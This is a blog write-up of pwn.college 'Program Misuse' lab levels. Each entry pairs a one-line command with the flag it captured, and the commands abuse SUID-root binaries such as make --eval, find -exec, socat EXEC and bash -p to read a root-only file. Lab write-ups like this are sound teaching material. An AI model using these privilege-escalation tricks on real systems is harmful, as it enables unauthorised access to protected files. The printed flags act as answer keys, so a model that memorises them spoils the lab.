<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Pwn College: Program Misuse | goldfish</title>
<meta name="keywords" content="">
<meta name="description" content="Privilege escalation Run an suid binary suid: execute with the eUID of the file owner rather than the parent process sgid: execute with the eGID of file owner rather than parent process sticky: used for shared directories to limit file removal to file owners babysuid Programs that let you directly read the flag by setting the suid
Archives 22 cpio https://www.computerhope.com/unix/ucpio.htm#Copy-Out-Mode cpio: copy files to and from archives
-R Set the ownership of all files created to the specified USER and/or GROUP --to-std-out">
<meta name="author" content="">
<link rel="canonical" href="https://g0ldf15h.github.io/posts/pwn_college/program_misuse/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://g0ldf15h.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://g0ldf15h.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://g0ldf15h.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://g0ldf15h.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://g0ldf15h.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-8YD66GB1T4"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-8YD66GB1T4', { 'anonymize_ip': false });
}
</script>
<meta property="og:title" content="Pwn College: Program Misuse" />
<meta property="og:description" content="Privilege escalation Run an suid binary suid: execute with the eUID of the file owner rather than the parent process sgid: execute with the eGID of file owner rather than parent process sticky: used for shared directories to limit file removal to file owners babysuid Programs that let you directly read the flag by setting the suid
Archives 22 cpio https://www.computerhope.com/unix/ucpio.htm#Copy-Out-Mode cpio: copy files to and from archives
-R Set the ownership of all files created to the specified USER and/or GROUP --to-std-out" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://g0ldf15h.github.io/posts/pwn_college/program_misuse/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-08-01T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-08-01T00:00:00+00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Pwn College: Program Misuse"/>
<meta name="twitter:description" content="Privilege escalation Run an suid binary suid: execute with the eUID of the file owner rather than the parent process sgid: execute with the eGID of file owner rather than parent process sticky: used for shared directories to limit file removal to file owners babysuid Programs that let you directly read the flag by setting the suid
Archives 22 cpio https://www.computerhope.com/unix/ucpio.htm#Copy-Out-Mode cpio: copy files to and from archives
-R Set the ownership of all files created to the specified USER and/or GROUP --to-std-out"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://g0ldf15h.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Pwn College: Program Misuse",
      "item": "https://g0ldf15h.github.io/posts/pwn_college/program_misuse/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Pwn College: Program Misuse",
  "name": "Pwn College: Program Misuse",
  "description": "Privilege escalation Run an suid binary suid: execute with the eUID of the file owner rather than the parent process sgid: execute with the eGID of file owner rather than parent process sticky: used for shared directories to limit file removal to file owners babysuid Programs that let you directly read the flag by setting the suid\nArchives 22 cpio https://www.computerhope.com/unix/ucpio.htm#Copy-Out-Mode cpio: copy files to and from archives\n-R Set the ownership of all files created to the specified USER and/or GROUP --to-std-out",
  "keywords": [
    
  ],
  "articleBody": "Privilege escalation Run an suid binary suid: execute with the eUID of the file owner rather than the parent process sgid: execute with the eGID of file owner rather than parent process sticky: used for shared directories to limit file removal to file owners babysuid Programs that let you directly read the flag by setting the suid\nArchives 22 cpio https://www.computerhope.com/unix/ucpio.htm#Copy-Out-Mode cpio: copy files to and from archives\n-R Set the ownership of all files created to the specified USER and/or GROUP --to-std-out\nWhen creating archives during copy out with -o, If you don’t pass an archive, it prints out the output to standard output\necho flag | cpio -ov flag �q�w��d��9flagpwn.college{4oCrlSizeUID4Sfh1W5ARqDaR3L.0FN2EDL0MDMwEzW} �q TRAILER!!!1 block Read flags by making them execute other commands 23 genisoimage Generate ISO9660/Joilet/HFS hybfrid filesystems\nhttps://gtfobins.github.io/gtfobins/genisoimage/ https://linux.die.net/man/1/genisoimage https://www.apt-browse.org/browse/debian/jessie/main/all/cdrkit-doc/9:1.1.11-3/file/usr/share/doc/cdrkit-doc/genisoimage/README.sort -sort FILE : Sort file content locations according to rules in FILE\n-sortsort_file\nSort file locations on the media. Sorting is controlled by a file that contains pairs of filenames and sorting offset weighting. If the weighting is higher, the file will be located closer to the beginning of the media, if the weighting is lower, the file will be located closer to the end of the media. There must be only one space or tabs character between the filename and the weight and the weight must be the last characters on a line. The filename is taken to include all the characters up to, but not including the last space or tab character on a line. This is to allow for space characters to be in, or at the end of a filename. This option does not sort the order of the filenames that appear in the ISO9660 directory. It sorts the order in which the file data is written to the CD image, which is useful in order to optimize the data layout on a CD. See README.sort for more details.\nhacker@program-misuse-level-23:/$ genisoimage -sort flag genisoimage: Incorrect sort file format pwn.college{gHWhhc5I1411-6NH28ekb-cUwQq.0VN2EDL0MDMwEzW} The sort_file contains two columns of filename and weight. Since the flag didn’t have the proper formatting, it printed it out in an error message\n24 env Usage: env [OPTION]… [-] [NAME=VALUE]… [COMMAND [ARG]…]\nenv cat flag pwn.college{QjA_o9dSRxJZr-qs3N6gL3Hk02a.0lN2EDL0MDMwEzW} 25 find https://www.baeldung.com/linux/find-exec-command Find the file and then use exec to run other commands on the file find flag -exec cat {} \\; pwn.college{QmQSDWK93OXRzLdFcc41GFD0sG0.01N2EDL0MDMwEzW} 26 make https://gtfobins.github.io/gtfobins/make/ https://stackoverflow.com/questions/10435490/how-eval-function-can-be-used-in-makefile https://make.mad-scientist.net/the-eval-function/ Interesting. eval wasn’t stated in the manual. It allows you to define new makefile constructs. The argument to the eval function is expanded, then the results of that expansion are parsed as makefile syntax. make -s --eval=$'x:\\n\\t-'\"cat flag\" pwn.college{sBoIeH0EhwZzqExS44fBJHf3Zmr.0FO2EDL0MDMwEzW} Disguising itself as makefile syntax to fool make to run the command. x variable : separates variable from command \\n\\t syntax (enter and indent) cat flag command\nx: cat flag eval notes Metaprogramming: ability of a program to generate other programs, or even modify itself while running\neval allows you to ask make to parse text that you provide (as the argument to the function) as if it were a makefile\n27 nice nice -n 20 cat flag pwn.college{UE17dBTj7bVqcsbAeMMcBtg1brP.0VO2EDL0MDMwEzW} 28 timeout timeout --preserve-status 0 cat flag pwn.college{k04-8k9lxNNXbW1dYdJg6wLbvOJ.0FM3EDL0MDMwEzW} 29 stdbuf stdbuf -i 0 cat flag pwn.college{QrX-myFr7VDaTJaUpMTWfOj9ac3.0VM3EDL0MDMwEzW} 30 setarch setarch -R cat flag pwn.college{0F9Xi_ucPd03t6kU9Z3ukyUjTzC.0lM3EDL0MDMwEzW} 31 watch watch -x cat flag 32 socat nc -l 9999 socat EXEC:\"cat flag\" TCP4:localhost:9999 pwn.college{Y-n7znhkzgIwpeVMFQVbmg7rUiy.0FN3EDL0MDMwEzW} Requires some light programming to read the flag.! 33 whiptail whiptail --textbox --scrolltext flag 10 50 34 awk awk '{print $1}' flag pwn.college{E9rO0UoMJAUFwehaimlPo66QYPH.0lN3EDL0MDMwEzW} 35 sed print first line of file\nsed -n '1p' flag pwn.college{8Etg6VfAzIv4QmA8cRGGs-hKba0.01N3EDL0MDMwEzW} 36 ed https://www.redhat.com/sysadmin/introduction-ed-editor ed flag ? p pwn.college{M_MFwqQw_lb6fPxx3Cwo7s1cy1B.0FO3EDL0MDMwEzW} Lets you get the flag by doing tricks with permissions! 37 chown https://phoenixnap.com/kb/linux-chown-command-with-examples chown hacker flag cat flag pwn.college{ox8X8D95ao8YTYZU1OhMovgkSlF.0VO3EDL0MDMwEzW} 38 chmod chmod 777 flag cat flag pwn.college{o_KtmcukknMa17Y7NaT_A_Vx0Jx.0FM4EDL0MDMwEzW} 39 cp https://stackoverflow.com/questions/34326484/how-to-copy-files-and-give-them-permission-of-destination-directory cp --no-preserve=mode,ownership flag boink cat boink pwn.college{cfFDqccRpUieZ-8IrmE3Bi_PIVX.0VM4EDL0MDMwEzW} 40 mv Wow this was a creative solution: https://hackmd.io/@jvX0z8tMSVy82TKMOd78zw/B1V06QEVo Had to read the writeup for it. So essentially I was poking around, trying to see if I could move files without preserving the permissions of the original file, but I wasn’t getting any results. I eventually read some writeups. This is such a fascinating challenge – rename cat to mv , run the challenge binary again to set the suid to mv which is cat in disguise, then read the flag\nmv /usr/bin/cat /usr/bin/mv ./challenge/babysuid_level40 mv flag pwn.college{gRrAxec-vA-hdRN8zrtYieTf24v.0lM4EDL0MDMwEzW} Lets you read the flag because they let you program anything! 41 perl https://www.geeksforgeeks.org/perl-opening-and-reading-a-file/\nNote had to use single quotes instead of double quotes perl -e 'open(fh, \"flag\") or die; $firstline = ; print \"$firstline\";' pwn.college{4omGoc2usqOLQHfIPTlErXr7ZV4.01M4EDL0MDMwEzW} 42 python Yay python! -c to compile\npython -c 'f=open(\"flag\", \"r\"); print(f.read())' pwn.college{woYeozdqCZlaPEQL5OHMOGhirJN.0FN4EDL0MDMwEzW} 43 ruby TF=$(mktemp) echo 'f=File.open(\"flag\"); r = f.read; puts(r) ' \u003e $TF ruby $TF pwn.college{sICaLJYVdT_rY74pyxtbb1r48tL.0VN4EDL0MDMwEzW} 44 bash https://stackoverflow.com/questions/63689353/suid-binary-privilege-escalation bash -p flag flag: line 1: pwn.college{wzjJgYq8MugKvbB17in-j2-Bv0h.0lN4EDL0MDMwEzW}: command not found -p privileged mode. Tells bash to not set up an environment and just run it with what you’re already using. Since setuid is set, it’s treated as root.\n(aka pretty please)\n45 date date --file=flag date: invalid date 'pwn.college{E57sz6e0gPPGZiyXahtDTw-AT0L.01N4EDL0MDMwEzW}' Just straight up wasn’t designed to let you read files! 46 dmesg dmesg -F flag [ 0.000000] pwn.college{I-e20m2Z1DlzHzNGmBdUcMzEPHU.0FO4EDL0MDMwEzW} 47 wc wc --files0-from=flag wc: 'pwn.college{oZ5vCz7SrQA_qbxZeCexxzmR-EQ.0VO4EDL0MDMwEzW}'$'\\n': No such file or directory 48 gcc gcc @flag gcc: error: pwn.college{gwjUmod94a_2j-jp8aIXUoxgIiW.0FM5EDL0MDMwEzW}: No such file or directory gcc: fatal error: no input files compilation terminated. 49 as as @flag Assembler messages: Error: can't open pwn.college{smeuseqsnW3x76HLH23ythuG_6V.0VM5EDL0MDMwEzW} for reading: No such file or directory ",
  "wordCount" : "899",
  "inLanguage": "en",
  "datePublished": "2023-08-01T00:00:00Z",
  "dateModified": "2023-08-01T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://g0ldf15h.github.io/posts/pwn_college/program_misuse/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "goldfish",
    "logo": {
      "@type": "ImageObject",
      "url": "https://g0ldf15h.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://g0ldf15h.github.io/" accesskey="h" title="goldfish (Alt + H)">goldfish</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://g0ldf15h.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://g0ldf15h.github.io/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://g0ldf15h.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="https://g0ldf15h.github.io/archives/" title="Archives">
                    <span>Archives</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://g0ldf15h.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://g0ldf15h.github.io/posts/">Posts</a></div>
    <h1 class="post-title">
      Pwn College: Program Misuse
    </h1>
    <div class="post-meta">&lt;span title=&#39;2023-08-01 00:00:00 &#43;0000 UTC&#39;&gt;August 1, 2023&lt;/span&gt;

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul><ul>
                <li>
                    <a href="#privilege-escalation" aria-label="Privilege escalation">Privilege escalation</a></li></ul>
                    
                <li>
                    <a href="#babysuid" aria-label="babysuid">babysuid</a><ul>
                        
                <li>
                    <a href="#archives" aria-label="Archives">Archives</a><ul>
                        
                <li>
                    <a href="#22-cpio" aria-label="22 cpio">22 cpio</a></li></ul>
                </li>
                <li>
                    <a href="#read-flags-by-making-them-execute-other-commands" aria-label="Read flags by making them execute other commands">Read flags by making them execute other commands</a><ul>
                        
                <li>
                    <a href="#23-genisoimage" aria-label="23 genisoimage">23 genisoimage</a></li>
                <li>
                    <a href="#24-env" aria-label="24 env">24 env</a></li>
                <li>
                    <a href="#25-find" aria-label="25 find">25 find</a></li>
                <li>
                    <a href="#26-make" aria-label="26 make">26 make</a><ul>
                        
                <li>
                    <a href="#eval-notes" aria-label="eval notes"><code>eval</code> notes</a></li></ul>
                </li>
                <li>
                    <a href="#27-nice" aria-label="27 nice">27 nice</a></li>
                <li>
                    <a href="#28-timeout" aria-label="28 timeout">28 timeout</a></li>
                <li>
                    <a href="#29-stdbuf" aria-label="29 stdbuf">29 stdbuf</a></li>
                <li>
                    <a href="#30-setarch" aria-label="30 setarch">30 setarch</a></li>
                <li>
                    <a href="#31-watch" aria-label="31 watch">31 watch</a></li>
                <li>
                    <a href="#32-socat" aria-label="32 socat">32 socat</a></li></ul>
                </li>
                <li>
                    <a href="#requires-some-light-programming-to-read-the-flag" aria-label="Requires some light programming to read the flag.!">Requires some light programming to read the flag.!</a><ul>
                        
                <li>
                    <a href="#33-whiptail" aria-label="33 whiptail">33 whiptail</a></li>
                <li>
                    <a href="#34-awk" aria-label="34 awk">34 awk</a></li>
                <li>
                    <a href="#35-sed" aria-label="35 sed">35 sed</a></li>
                <li>
                    <a href="#36-ed" aria-label="36 ed">36 ed</a></li></ul>
                </li>
                <li>
                    <a href="#lets-you-get-the-flag-by-doing-tricks-with-permissions" aria-label="Lets you get the flag by doing tricks with permissions!">Lets you get the flag by doing tricks with permissions!</a><ul>
                        
                <li>
                    <a href="#37-chown" aria-label="37 chown">37 chown</a></li>
                <li>
                    <a href="#38-chmod" aria-label="38 chmod">38 chmod</a></li>
                <li>
                    <a href="#39-cp" aria-label="39 cp">39 cp</a></li>
                <li>
                    <a href="#40-mv" aria-label="40 mv">40 mv</a></li></ul>
                </li>
                <li>
                    <a href="#lets-you-read-the-flag-because-they-let-you-program-anything" aria-label="Lets you read the flag because they let you program anything!">Lets you read the flag because they let you program anything!</a><ul>
                        
                <li>
                    <a href="#41-perl" aria-label="41 perl">41 perl</a></li>
                <li>
                    <a href="#42-python" aria-label="42 python">42 python</a></li>
                <li>
                    <a href="#43-ruby" aria-label="43 ruby">43 ruby</a></li>
                <li>
                    <a href="#44-bash" aria-label="44 bash">44 bash</a></li>
                <li>
                    <a href="#45-date" aria-label="45 date">45 date</a></li></ul>
                </li>
                <li>
                    <a href="#just-straight-up-wasnt-designed-to-let-you-read-files" aria-label="Just straight up wasn&amp;rsquo;t designed to let you read files!">Just straight up wasn&rsquo;t designed to let you read files!</a><ul>
                        
                <li>
                    <a href="#46-dmesg" aria-label="46 dmesg">46 dmesg</a></li>
                <li>
                    <a href="#47-wc" aria-label="47 wc">47 wc</a></li>
                <li>
                    <a href="#48-gcc" aria-label="48 gcc">48 gcc</a></li>
                <li>
                    <a href="#49-as" aria-label="49 as">49 as</a>
                </li>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="privilege-escalation">Privilege escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h2>
<ul>
<li>Run an suid binary</li>
<li><strong>suid</strong>: execute with the eUID of the file owner rather than the parent process</li>
<li><strong>sgid</strong>: execute with the eGID of file owner rather than parent process</li>
<li><strong>sticky</strong>: used for shared directories to limit file removal to file owners</li>
</ul>
<h1 id="babysuid">babysuid<a hidden class="anchor" aria-hidden="true" href="#babysuid">#</a></h1>
<p>Programs that let you directly read the flag by setting the suid</p>
<h2 id="archives">Archives<a hidden class="anchor" aria-hidden="true" href="#archives">#</a></h2>
<h3 id="22-cpio">22 cpio<a hidden class="anchor" aria-hidden="true" href="#22-cpio">#</a></h3>
<ul>
<li><a href="https://www.computerhope.com/unix/ucpio.htm#Copy-Out-Mode">https://www.computerhope.com/unix/ucpio.htm#Copy-Out-Mode</a></li>
</ul>
<p><strong>cpio</strong>: copy files to and from archives</p>
<p><code>-R</code> Set the ownership of all files created to the specified USER and/or GROUP
<code>--to-std-out</code></p>
<p>When creating archives during <em>copy out</em> with <code>-o</code>, If you don&rsquo;t pass an archive, it prints out the output to standard output</p>
<pre tabindex="0"><code>echo flag | cpio -ov
flag
�q�w��d��9flagpwn.college{4oCrlSizeUID4Sfh1W5ARqDaR3L.0FN2EDL0MDMwEzW}
�q
  TRAILER!!!1 block
</code></pre><h2 id="read-flags-by-making-them-execute-other-commands">Read flags by making them execute other commands<a hidden class="anchor" aria-hidden="true" href="#read-flags-by-making-them-execute-other-commands">#</a></h2>
<h3 id="23-genisoimage">23 genisoimage<a hidden class="anchor" aria-hidden="true" href="#23-genisoimage">#</a></h3>
<p>Generate ISO9660/Joilet/HFS hybfrid filesystems</p>
<ul>
<li><a href="https://gtfobins.github.io/gtfobins/genisoimage/">https://gtfobins.github.io/gtfobins/genisoimage/</a></li>
<li><a href="https://linux.die.net/man/1/genisoimage">https://linux.die.net/man/1/genisoimage</a></li>
<li><a href="https://www.apt-browse.org/browse/debian/jessie/main/all/cdrkit-doc/9:1.1.11-3/file/usr/share/doc/cdrkit-doc/genisoimage/README.sort">https://www.apt-browse.org/browse/debian/jessie/main/all/cdrkit-doc/9:1.1.11-3/file/usr/share/doc/cdrkit-doc/genisoimage/README.sort</a></li>
</ul>
<p><code>-sort FILE</code> : Sort file content locations according to rules in FILE</p>
<p><strong>-sort</strong><em>sort_file</em></p>
<p>Sort file locations on the media. Sorting is controlled by a file that contains pairs of filenames and sorting offset weighting. If the weighting is higher, the file will be located closer to the beginning of the media, if the weighting is lower, the file will be located closer to the end of the media. There must be only one space or tabs character between the filename and the weight and the weight must be the last characters on a line. The filename is taken to include all the characters up to, but not including the last space or tab character on a line. This is to allow for space characters to be in, or at the end of a filename. This option does <strong>not</strong> sort the order of the filenames that appear in the ISO9660 directory. It sorts the order in which the file data is written to the CD image, which is useful in order to optimize the data layout on a CD. See <strong>README.sort</strong> for more details.</p>
<pre tabindex="0"><code>hacker@program-misuse-level-23:/$ genisoimage -sort flag
genisoimage: Incorrect sort file format
        pwn.college{gHWhhc5I1411-6NH28ekb-cUwQq.0VN2EDL0MDMwEzW}
</code></pre><p>The sort_file contains two columns of filename and weight. Since the flag didn&rsquo;t have the proper formatting, it printed it out in an error message</p>
<h3 id="24-env">24 env<a hidden class="anchor" aria-hidden="true" href="#24-env">#</a></h3>
<p>Usage: env [OPTION]&hellip; [-] [NAME=VALUE]&hellip; [COMMAND [ARG]&hellip;]</p>
<pre tabindex="0"><code>env cat flag
pwn.college{QjA_o9dSRxJZr-qs3N6gL3Hk02a.0lN2EDL0MDMwEzW}
</code></pre><h3 id="25-find">25 find<a hidden class="anchor" aria-hidden="true" href="#25-find">#</a></h3>
<ul>
<li><a href="https://www.baeldung.com/linux/find-exec-command">https://www.baeldung.com/linux/find-exec-command</a>
Find the file and then use <code>exec</code> to run other commands on the file</li>
</ul>
<pre tabindex="0"><code>find flag -exec cat {} \;
pwn.college{QmQSDWK93OXRzLdFcc41GFD0sG0.01N2EDL0MDMwEzW}
</code></pre><h3 id="26-make">26 make<a hidden class="anchor" aria-hidden="true" href="#26-make">#</a></h3>
<ul>
<li><a href="https://gtfobins.github.io/gtfobins/make/">https://gtfobins.github.io/gtfobins/make/</a></li>
<li><a href="https://stackoverflow.com/questions/10435490/how-eval-function-can-be-used-in-makefile">https://stackoverflow.com/questions/10435490/how-eval-function-can-be-used-in-makefile</a></li>
<li><a href="https://make.mad-scientist.net/the-eval-function/">https://make.mad-scientist.net/the-eval-function/</a>
Interesting. <code>eval</code> wasn&rsquo;t stated in the manual. It allows you to define new makefile constructs. The argument to the eval function is expanded, then the results of that expansion are parsed as makefile syntax.</li>
</ul>
<pre tabindex="0"><code>make -s --eval=$&#39;x:\n\t-&#39;&#34;cat flag&#34;
pwn.college{sBoIeH0EhwZzqExS44fBJHf3Zmr.0FO2EDL0MDMwEzW}
</code></pre><p>Disguising itself as makefile syntax to fool make to run the command.
<code>x</code> variable
<code>:</code> separates variable from command
<code>\n\t</code> syntax (enter and indent)
<code>cat flag</code> command</p>
<pre tabindex="0"><code>x: 
	cat flag
</code></pre><h4 id="eval-notes"><code>eval</code> notes<a hidden class="anchor" aria-hidden="true" href="#eval-notes">#</a></h4>
<p><strong>Metaprogramming</strong>: ability of a program to generate other programs, or even modify itself while running</p>
<p><code>eval</code> allows you to ask <code>make</code> to parse text that you provide (as the argument to the function) as if it were a makefile</p>
<h3 id="27-nice">27 nice<a hidden class="anchor" aria-hidden="true" href="#27-nice">#</a></h3>
<pre tabindex="0"><code>nice -n 20 cat flag
pwn.college{UE17dBTj7bVqcsbAeMMcBtg1brP.0VO2EDL0MDMwEzW}
</code></pre><h3 id="28-timeout">28 timeout<a hidden class="anchor" aria-hidden="true" href="#28-timeout">#</a></h3>
<pre tabindex="0"><code>timeout --preserve-status 0 cat flag
pwn.college{k04-8k9lxNNXbW1dYdJg6wLbvOJ.0FM3EDL0MDMwEzW}
</code></pre><h3 id="29-stdbuf">29 stdbuf<a hidden class="anchor" aria-hidden="true" href="#29-stdbuf">#</a></h3>
<pre tabindex="0"><code>stdbuf -i 0 cat flag
pwn.college{QrX-myFr7VDaTJaUpMTWfOj9ac3.0VM3EDL0MDMwEzW}
</code></pre><h3 id="30-setarch">30 setarch<a hidden class="anchor" aria-hidden="true" href="#30-setarch">#</a></h3>
<pre tabindex="0"><code>setarch -R cat flag
pwn.college{0F9Xi_ucPd03t6kU9Z3ukyUjTzC.0lM3EDL0MDMwEzW}
</code></pre><h3 id="31-watch">31 watch<a hidden class="anchor" aria-hidden="true" href="#31-watch">#</a></h3>
<pre tabindex="0"><code>watch -x cat flag
</code></pre><h3 id="32-socat">32 socat<a hidden class="anchor" aria-hidden="true" href="#32-socat">#</a></h3>
<pre tabindex="0"><code>nc -l 9999
socat EXEC:&#34;cat flag&#34; TCP4:localhost:9999

pwn.college{Y-n7znhkzgIwpeVMFQVbmg7rUiy.0FN3EDL0MDMwEzW}
</code></pre><h2 id="requires-some-light-programming-to-read-the-flag">Requires some light programming to read the flag.!<a hidden class="anchor" aria-hidden="true" href="#requires-some-light-programming-to-read-the-flag">#</a></h2>
<h3 id="33-whiptail">33 whiptail<a hidden class="anchor" aria-hidden="true" href="#33-whiptail">#</a></h3>
<pre tabindex="0"><code>whiptail --textbox --scrolltext flag 10 50
</code></pre><p><img loading="lazy" src="images/whiptail.png" alt="image"  />
</p>
<h3 id="34-awk">34 awk<a hidden class="anchor" aria-hidden="true" href="#34-awk">#</a></h3>
<pre tabindex="0"><code>awk &#39;{print $1}&#39; flag
pwn.college{E9rO0UoMJAUFwehaimlPo66QYPH.0lN3EDL0MDMwEzW}
</code></pre><h3 id="35-sed">35 sed<a hidden class="anchor" aria-hidden="true" href="#35-sed">#</a></h3>
<p>print first line of file</p>
<pre tabindex="0"><code>sed -n &#39;1p&#39; flag
pwn.college{8Etg6VfAzIv4QmA8cRGGs-hKba0.01N3EDL0MDMwEzW}
</code></pre><h3 id="36-ed">36 ed<a hidden class="anchor" aria-hidden="true" href="#36-ed">#</a></h3>
<ul>
<li><a href="https://www.redhat.com/sysadmin/introduction-ed-editor">https://www.redhat.com/sysadmin/introduction-ed-editor</a></li>
</ul>
<pre tabindex="0"><code>ed flag
?
p
pwn.college{M_MFwqQw_lb6fPxx3Cwo7s1cy1B.0FO3EDL0MDMwEzW}
</code></pre><h2 id="lets-you-get-the-flag-by-doing-tricks-with-permissions">Lets you get the flag by doing tricks with permissions!<a hidden class="anchor" aria-hidden="true" href="#lets-you-get-the-flag-by-doing-tricks-with-permissions">#</a></h2>
<h3 id="37-chown">37 chown<a hidden class="anchor" aria-hidden="true" href="#37-chown">#</a></h3>
<ul>
<li><a href="https://phoenixnap.com/kb/linux-chown-command-with-examples">https://phoenixnap.com/kb/linux-chown-command-with-examples</a></li>
</ul>
<pre tabindex="0"><code>chown hacker flag
cat flag
pwn.college{ox8X8D95ao8YTYZU1OhMovgkSlF.0VO3EDL0MDMwEzW}
</code></pre><h3 id="38-chmod">38 chmod<a hidden class="anchor" aria-hidden="true" href="#38-chmod">#</a></h3>
<pre tabindex="0"><code>chmod 777 flag
cat flag
pwn.college{o_KtmcukknMa17Y7NaT_A_Vx0Jx.0FM4EDL0MDMwEzW}
</code></pre><h3 id="39-cp">39 cp<a hidden class="anchor" aria-hidden="true" href="#39-cp">#</a></h3>
<ul>
<li><a href="https://stackoverflow.com/questions/34326484/how-to-copy-files-and-give-them-permission-of-destination-directory">https://stackoverflow.com/questions/34326484/how-to-copy-files-and-give-them-permission-of-destination-directory</a></li>
</ul>
<pre tabindex="0"><code>cp --no-preserve=mode,ownership flag boink
cat boink
pwn.college{cfFDqccRpUieZ-8IrmE3Bi_PIVX.0VM4EDL0MDMwEzW}
</code></pre><h3 id="40-mv">40 mv<a hidden class="anchor" aria-hidden="true" href="#40-mv">#</a></h3>
<p>Wow this was a creative solution: <a href="https://hackmd.io/@jvX0z8tMSVy82TKMOd78zw/B1V06QEVo">https://hackmd.io/@jvX0z8tMSVy82TKMOd78zw/B1V06QEVo</a>
Had to read the writeup for it.
So essentially I was poking around, trying to see if I could move files without preserving the permissions of the original file, but I wasn&rsquo;t getting any results. I eventually read some writeups. This is such a fascinating challenge &ndash; rename <code>cat</code> to <code>mv</code> , run the challenge binary again to set the suid to <code>mv</code> which is <code>cat</code> in disguise, then read the flag</p>
<pre tabindex="0"><code>mv /usr/bin/cat /usr/bin/mv
./challenge/babysuid_level40 
mv flag
pwn.college{gRrAxec-vA-hdRN8zrtYieTf24v.0lM4EDL0MDMwEzW}
</code></pre><h2 id="lets-you-read-the-flag-because-they-let-you-program-anything">Lets you read the flag because they let you program anything!<a hidden class="anchor" aria-hidden="true" href="#lets-you-read-the-flag-because-they-let-you-program-anything">#</a></h2>
